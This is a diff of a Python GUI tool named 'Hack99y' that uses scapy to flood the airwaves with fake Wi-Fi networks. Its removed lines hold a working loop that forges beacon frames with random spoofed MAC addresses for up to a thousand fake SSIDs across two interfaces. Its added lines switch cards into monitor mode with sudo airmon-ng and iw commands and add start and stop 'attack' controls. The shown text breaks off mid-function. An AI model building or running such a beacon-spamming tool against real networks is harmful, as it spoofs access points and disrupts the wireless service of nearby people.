@@ -3,10 +3,9 @@ import os
 import threading
 import time
 import psutil
-import random
 from scapy.all import *
 
-# إعدادات المظهر - نمط كالي
+# إعدادات الواجهة
 ctk.set_appearance_mode("Dark")
 ctk.set_default_color_theme("green")
 
@@ -14,15 +13,14 @@ class Hack99y(ctk.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("Hack99y - Dual Interface Wireless Spammer")
-        self.geometry("900x700")
+        self.title("Hack99y - Control Panel")
+        self.geometry("850x700")
 
         self.is_running = False
         self.sent_packets = 0
-        self.detected_ssids = set()
         self.interfaces = ["wlan0", "wlan1"]
 
-        # شعار ASCII الخاص بك
+        # شعار ASCII
         self.ascii_label = ctk.CTkLabel(self, text="""
    _  _    _    ____ _  _______  ___  _   _ 
   | || |  / \  / ___| |/ / ___||_ _|| | | |
@@ -32,85 +30,87 @@ class Hack99y(ctk.CTk):
         """, font=("Courier", 12), text_color="#00FF00")
         self.ascii_label.pack(pady=10)
 
-        # لوحة الإحصائيات (Statistics)
-        self.stats_frame = ctk.CTkFrame(self, fg_color="#0a0a0a", border_width=1, border_color="#00FF00")
-        self.stats_frame.pack(pady=10, padx=20, fill="x")
+        # --- لوحة التحكم في الأوضاع (Modes) ---
+        self.mode_frame = ctk.CTkFrame(self)
+        self.mode_frame.pack(pady=10, padx=20, fill="x")
 
-        self.pkts_label = ctk.CTkLabel(self.stats_frame, text="Sent Packets: 0", font=("Consolas", 14, "bold"))
-        self.pkts_label.grid(row=0, column=0, padx=30, pady=15)
+        self.mon_btn = ctk.CTkButton(self.mode_frame, text="Monitor Mode", fg_color="#2980b9", command=self.set_monitor)
+        self.mon_btn.pack(side="left", padx=20, pady=15, expand=True)
 
-        self.active_ifaces = ctk.CTkLabel(self.stats_frame, text="Active: wlan0, wlan1", font=("Consolas", 14), text_color="#3498db")
-        self.active_ifaces.grid(row=0, column=1, padx=30, pady=15)
+        self.man_btn = ctk.CTkButton(self.mode_frame, text="Managed Mode", fg_color="#8e44ad", command=self.set_managed)
+        self.man_btn.pack(side="left", padx=20, pady=15, expand=True)
 
-        self.cpu_label = ctk.CTkLabel(self.stats_frame, text="CPU: 0%", font=("Consolas", 14, "bold"))
-        self.cpu_label.grid(row=0, column=2, padx=30, pady=15)
+        # --- التحكم في عدد الشبكات ---
+        self.config_frame = ctk.CTkFrame(self)
+        self.config_frame.pack(pady=10, padx=20, fill="x")
 
-        # قسم التحكم
-        self.ctrl_frame = ctk.CTkFrame(self)
-        self.ctrl_frame.pack(pady=10, padx=20, fill="x")
+        self.slider_label = ctk.CTkLabel(self.config_frame, text="Broadcast Range: hacky0 to hacky500", font=("Arial", 14))
+        self.slider_label.pack(pady=5)
 
-        self.status_text = ctk.CTkLabel(self.ctrl_frame, text="Ready to broadcast hacky0 - hacky999", text_color="yellow")
-        self.status_text.pack(pady=5)
+        self.range_slider = ctk.CTkSlider(self.config_frame, from_=1, to=1000, number_of_steps=1000, command=self.update_range_label)
+        self.range_slider.pack(padx=20, pady=10, fill="x")
+        self.range_slider.set(500)
 
-        self.start_btn = ctk.CTkButton(self.ctrl_frame, text="START BROADCAST", fg_color="#1b5e20", height=40, font=("Consolas", 16, "bold"), command=self.engine_toggle)
-        self.start_btn.pack(pady=10, padx=50, fill="x")
+        # --- أزرار التشغيل والإيقاف ---
+        self.action_frame = ctk.CTkFrame(self, fg_color="transparent")
+        self.action_frame.pack(pady=10, padx=20, fill="x")
 
-        # شاشة المراقبة
-        self.console = ctk.CTkTextbox(self, height=250, fg_color="#000000", text_color="#00FF00", font=("Consolas", 12))
-        self.console.pack(pady=10, padx=20, fill="both", expand=True)
+        self.start_btn = ctk.CTkButton(self.action_frame, text="START BROADCAST", fg_color="#27ae60", height=45, command=self.start_attack)
+        self.start_btn.pack(side="left", padx=10, expand=True, fill="x")
 
-        threading.Thread(target=self.update_stats, daemon=True).start()
+        self.stop_btn = ctk.CTkButton(self.action_frame, text="STOP BROADCAST", fg_color="#c0392b", height=45, command=self.stop_attack)
+        self.stop_btn.pack(side="left", padx=10, expand=True, fill="x")
+
+        # --- الإحصائيات ---
+        self.log_box = ctk.CTkTextbox(self, height=200, fg_color="black", text_color="#00FF00")
+        self.log_box.pack(pady=10, padx=20, fill="both")
+
+        self.status_label = ctk.CTkLabel(self, text="System Idle | Packets: 0", text_color="yellow")
+        self.status_label.pack(pady=5)
 
     def log(self, msg):
-        self.console.insert("end", f"[#] {msg}\n")
-        self.console.see("end")
+        self.log_box.insert("end", f"[*] {msg}\n")
+        self.log_box.see("end")
 
-    def update_stats(self):
-        while True:
-            self.cpu_label.configure(text=f"CPU: {psutil.cpu_percent()}%")
-            self.pkts_label.configure(text=f"Sent: {self.sent_packets}")
-            time.sleep(1)
+    def update_range_label(self, value):
+        self.slider_label.configure(text=f"Broadcast Range: hacky0 to hacky{int(value)-1}")
 
-    def engine_toggle(self):
+    def set_monitor(self):
+        self.log("Switching interfaces to Monitor Mode...")
+        os.system("sudo airmon-ng check kill")
+        for iface in self.interfaces:
+            os.system(f"sudo ip link set {iface} down")
+            os.system(f"sudo iw dev {iface} set type monitor")
+            os.system(f"sudo ip link set {iface} up")
+            self.log(f"{iface} -> Monitor Mode [OK]")
+
+    def set_managed(self):
+        self.log("Switching interfaces to Managed Mode (Reset)...")
+        for iface in self.interfaces:
+            os.system(f"sudo ip link set {iface} down")
+            os.system(f"sudo iw dev {iface} set type managed")
+            os.system(f"sudo ip link set {iface} up")
+            self.log(f"{iface} -> Managed Mode [OK]")
+        os.system("sudo systemctl restart NetworkManager")
+
+    def start_attack(self):
         if not self.is_running:
             self.is_running = True
-            self.start_btn.configure(text="STOP ATTACK", fg_color="#b71c1c")
-            self.log("Initializing Dual-Interface Spammer...")
-            # إطلاق خيوط منفصلة لكل كرت وايرلس
+            self.log(f"Starting broadcast for {int(self.range_slider.get())} networks...")
             for iface in self.interfaces:
-                threading.Thread(target=self.attack_loop, args=(iface,), daemon=True).start()
-        else:
-            self.is_running = False
-            self.start_btn.configure(text="START BROADCAST", fg_color="#1b5e20")
-            self.log("Halting all operations.")
+                threading.Thread(target=self.broadcast_logic, args=(iface,), daemon=True).start()
+            threading.Thread(target=self.update_counter, daemon=True).start()
 
-    def attack_loop(self, iface):
-        self.log(f"Broadcasting hacky0-999 on {iface}...")
-        
-        # إعداد قائمة الأسماء hacky0 إلى hacky999
-        ssids = [f"hacky{i}" for i in range(1000)]
-        
+    def stop_attack(self):
+        self.is_running = False
+        self.log("Broadcast Stopped.")
+
+    def update_counter(self):
         while self.is_running:
-            for ssid in ssids:
-                if not self.is_running: break
-                
-                # تزوير عنوان MAC عشوائي لكل شبكة
-                fake_mac = randmac()
-                
-                # بناء حزمة Beacon
-                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_mac, addr3=fake_mac)
-                beacon = Dot11Beacon(cap="ESS+privacy")
-                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-                frame = RadioTap()/dot11/beacon/essid
-                
-                try:
-                    sendp(frame, iface=iface, verbose=False, count=1)
-                    self.sent_packets += 1
-                except:
-                    self.log(f"Error on {iface}: Check if interface is in Monitor Mode")
-                    self.is_running = False
-                    break
-            
-            time.sleep(0.01) # تأخير بسيط لضمان استقرار الكرت
+            self.status_label.configure(text=f"ATTACK ACTIVE | Packets Sent: {self.sent_packets}")
+            time.sleep(0.5)
 
-
+    def broadcast_logic(self, iface):
+        limit = int(self.range_slider.get())
+        ssids = [f"hacky{i}" for i in range(limit)]
+        while
